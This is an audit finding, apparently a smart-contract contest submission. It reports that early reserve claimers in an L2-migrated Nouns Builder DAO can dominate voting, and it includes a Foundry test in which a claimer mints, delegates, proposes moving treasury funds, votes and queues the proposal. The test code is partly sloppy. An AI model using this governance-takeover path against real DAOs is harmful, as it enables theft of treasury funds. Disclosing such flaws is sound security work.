Curly Blush Wombat

medium

# Early migration claimers have majority voting power

## Summary
First few claimers of the minter will have majority voting power as total supply of NFT is low.

## Vulnerability Detail
MerkleReserveMinter contract allows early claimer or bad actor to backrun the deployment of the DAO on L2, allowing him to potentially vote maliciously where voting with the NFT is involved. 

## Impact
From griefing to taking over the contract if not vetoed or voted against.

## Code Snippet
Here is an example of how it can happen:

// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;
```

import { console } from "forge-std/Test.sol";
import { NounsBuilderTest } from "./utils/NounsBuilderTest.sol";
import { MetadataRendererTypesV1 } from "../src/token/metadata/types/MetadataRendererTypesV1.sol";
import { L2MigrationDeployer } from "../src/deployers/L2MigrationDeployer.sol";
import { MerkleReserveMinter } from "../src/minters/MerkleReserveMinter.sol";
import { MockCrossDomainMessenger } from "./utils/mocks/MockCrossDomainMessenger.sol";

import { TokenTypesV2 } from "../src/token/types/TokenTypesV2.sol";
import { IToken, Token } from "../src/token/Token.sol";
import { MetadataRenderer } from "../src/token/metadata/MetadataRenderer.sol";
import { IAuction, Auction } from "../src/auction/Auction.sol";
import { IGovernor, Governor } from "../src/governance/governor/Governor.sol";
import { ITreasury, Treasury } from "../src/governance/treasury/Treasury.sol";

contract L2MigrationDeployerTest is NounsBuilderTest {
    MockCrossDomainMessenger xDomainMessenger;
    MerkleReserveMinter minter;
    L2MigrationDeployer deployer;
    MerkleReserveMinter.MerkleMinterSettings minterParams;

    address internal claimer1;
    address internal claimer2;

    function setUp() public virtual override {
        super.setUp();

        claimer1 = address(0xC1);
        claimer2 = address(0xC2);

        minter = new MerkleReserveMinter(address(manager), rewards);
        xDomainMessenger = new MockCrossDomainMessenger(founder);
        deployer = new L2MigrationDeployer(address(manager), address(minter), address(xDomainMessenger));
    }

    function deploy() internal {
        setAltMockFounderParams();

        setMockTokenParamsWithReserve(7);

        setMockAuctionParams();

        setMockGovParams();

        bytes32 root = bytes32(0x5e0da80989496579de029b8ad2f9c234e8de75f5487035210bfb7676e386af8b);

        minterParams = MerkleReserveMinter.MerkleMinterSettings({
            mintStart: 0,
            mintEnd: uint64(block.timestamp + 1000),
            pricePerToken: 0.5 ether,
            merkleRoot: root
        });
        
        vm.startPrank(address(xDomainMessenger));

        address _token = deployer.deploy(foundersArr, tokenParams, auctionParams, govParams, minterParams);

        addMetadataProperties();

        deployer.renounceOwnership();

        vm.stopPrank();

        (address _metadata, address _auction, address _treasury, address _governor) = manager.getAddresses(_token);

        token = Token(_token);
        metadataRenderer = MetadataRenderer(_metadata);
        auction = Auction(_auction);
        treasury = Treasury(payable(_treasury));
        governor = Governor(_governor);

        vm.label(address(token), "TOKEN");
        vm.label(address(metadataRenderer), "METADATA_RENDERER");
        vm.label(address(auction), "AUCTION");
        vm.label(address(treasury), "TREASURY");
        vm.label(address(governor), "GOVERNOR");
    }

        function setAltMockFounderParams() internal virtual {
        address[] memory wallets = new address[](3);
        uint256[] memory percents = new uint256[](3);
        uint256[] memory vestingEnds = new uint256[](3);

        wallets[0] = address(deployer);
        wallets[1] = founder;
        wallets[2] = founder2;

        percents[0] = 0;
        percents[1] = 10;
        percents[2] = 5;

        percents[0] = 0;
        vestingEnds[1] = 4 weeks;
        vestingEnds[2] = 4 weeks;

        setFounderParams(wallets, percents, vestingEnds);
    }

    function addMetadataProperties() internal {
        string[] memory names = new string[](1);
        names[0] = "testing";
        MetadataRendererTypesV1.ItemParam[] memory items = new MetadataRendererTypesV1.ItemParam[](2);
        items[0] = MetadataRendererTypesV1.ItemParam({ propertyId: 0, name: "failure1", isNewProperty: true });
        items[1] = MetadataRendererTypesV1.ItemParam({ propertyId: 0, name: "failure2", isNewProperty: true });

        MetadataRendererTypesV1.IPFSGroup memory ipfsGroup = MetadataRendererTypesV1.IPFSGroup({ baseUri: "BASE_URI", extension: "EXTENSION" });

        bytes memory data = abi.encodeWithSignature("addProperties(string[],(uint256,string,bool)[],(string,string))", names, items, ipfsGroup);
        deployer.callMetadataRenderer(data);
    }


    function test_EarlyClaimer() public {
        
        // deploy on L2
        deploy();

        // set minters and mint nfts for claimer1

        TokenTypesV2.MinterParams memory params = TokenTypesV2.MinterParams({ minter: address(minter), allowed: true });
        TokenTypesV2.MinterParams[] memory minters = new TokenTypesV2.MinterParams[](1);
        minters[0] = params;
        vm.prank(address(treasury));
        token.updateMinters(minters);

        bytes32[] memory proof = new bytes32[](1);
        proof[0] = bytes32(0xd77d6d8eeae66a03ce8ecdba82c6a0ce9cff76f7a4a6bc2bdc670680d3714273);

        bytes32[] memory proof2 = new bytes32[](1);
        proof2[0] = bytes32(0x1845cf6ae7e4ea2bf7813e2b8bc2c114d32bd93817b2f113543c4e0ebc1f38d2);
        
        MerkleReserveMinter.MerkleClaim[] memory claims = new MerkleReserveMinter.MerkleClaim[](1);
        claims[0] = MerkleReserveMinter.MerkleClaim({ mintTo: claimer1, tokenId: 5, merkleProof: proof });

        uint256 fees = minter.getTotalFeesForMint(address(token), claims.length);

        vm.deal(claimer1, fees);
        vm.prank(claimer1);
        minter.mintFromReserve{ value: fees }(address(token), claims);

        
        // claimer1 proposing random proposals
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encodeWithSelector("");

        address[] memory addressArray = new address[](1);
        addressArray[0] = address(treasury);

        uint256[] memory someNumbers = new uint256[](1); 
        someNumbers[0] = 10 ether;

        bytes[] memory data2 = new bytes[](1);
        data[0] = "0x1";
    
        vm.startPrank(claimer1);
        token.delegate(claimer1);

        vm.warp(block.timestamp + 1 seconds);

        governor.propose(addressArray, someNumbers, data, "");
        governor.propose(addressArray, someNumbers, data2, "");

        vm.warp(block.timestamp + 10 seconds);
        governor.castVote(0x765557dd55d1d61ac81d74a3e0f4b0ad4c3a34098c6eaffde719a73195a9187c, 1);
        vm.warp(block.timestamp + 1 weeks);
        governor.queue(0x765557dd55d1d61ac81d74a3e0f4b0ad4c3a34098c6eaffde719a73195a9187c);

        

    }
}

```

## Tool used

Manual Review, Foundry

## Recommendation

Start the governance contracts paused and allow unpausing of contracts from `L2MigrationDeployer.sol `or minimum mint required before voting can start.
